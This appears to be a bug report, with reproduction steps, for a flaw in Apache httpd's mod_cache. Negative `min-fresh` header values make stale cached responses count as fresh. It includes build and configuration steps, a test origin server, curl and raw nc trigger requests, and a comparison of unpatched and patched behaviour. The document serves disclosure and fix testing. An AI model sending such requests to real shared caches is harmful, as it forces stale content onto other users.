# 026 — Negative min-fresh extends cache freshness

`ap_cache_control()` at `modules/cache/cache_util.c:1083` accepts negative
`Cache-Control: min-fresh=` values. Because `minfresh` is later subtracted
from the freshness window, a negative client value extends acceptable age
and lets stale cache entries be served as fresh.

## Setup

Build httpd with mod_cache and mod_cache_disk:

```bash
./configure --prefix=$PWD/inst \
    --enable-cache --enable-cache-disk --enable-proxy --enable-proxy-http
make -j && make install
```

`httpd.conf` snippet:

```apache
LoadModule cache_module      modules/mod_cache.so
LoadModule cache_disk_module modules/mod_cache_disk.so
LoadModule proxy_module      modules/mod_proxy.so
LoadModule proxy_http_module modules/mod_proxy_http.so

CacheRoot         "/tmp/cache"
CacheEnable       disk "/"
CacheQuickHandler on
CacheHeader       on

ProxyPass        /  http://127.0.0.1:9000/
ProxyPassReverse /  http://127.0.0.1:9000/
```

A cooperating origin issuing short-lived responses with stable bodies, plus a
counter so the test can tell origin hits from cache hits:

```bash
mkdir -p /tmp/cache
python3 - <<'PY' &
from http.server import BaseHTTPRequestHandler, HTTPServer
N=[0]
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        N[0]+=1
        body=f"origin-hit-{N[0]}\n".encode()
        self.send_response(200)
        self.send_header('Cache-Control','max-age=10')
        self.send_header('Content-Type','text/plain')
        self.send_header('Content-Length',str(len(body)))
        self.end_headers()
        self.wfile.write(body)
HTTPServer(('127.0.0.1',9000), H).serve_forever()
PY
```

## Trigger

Prime the cache and let it go stale:

```bash
curl -s http://127.0.0.1:8080/obj    # origin-hit-1, cached with max-age=10
sleep 25                              # age > max-age → stale
```

A well-behaved cache must revalidate on the next fetch. The malicious
header instead extends the window:

```bash
curl -sD- -o- http://127.0.0.1:8080/obj \
  -H 'Cache-Control: min-fresh=-86400'
```

Equivalent raw form:

```bash
python3 -c "import sys; sys.stdout.buffer.write(
    b'GET /obj HTTP/1.1\r\nHost: x\r\n'
    b'Cache-Control: min-fresh=-86400\r\n\r\n')" \
  | nc 127.0.0.1 8080
```

## Observed effect

Unpatched: response body is `origin-hit-1`, `Age: 25` or higher, headers
include `X-Cache: HIT`, and the origin counter does not advance — the
expression `age < (maxage + 0 - (-86400))` is true for any plausible age, so
stale content is served indefinitely.

Patched: the `min-fresh=-86400` token is rejected during parsing, the cache
falls through to revalidation, the origin counter advances to
`origin-hit-2`, and the response carries `X-Cache: REVALIDATE` or `MISS`.

## Notes

The same effect can be amplified across many objects with one persistent
connection; a single attacker-controlled request can pin every shared cache
entry to its last-known stale body until the entry is evicted by size.
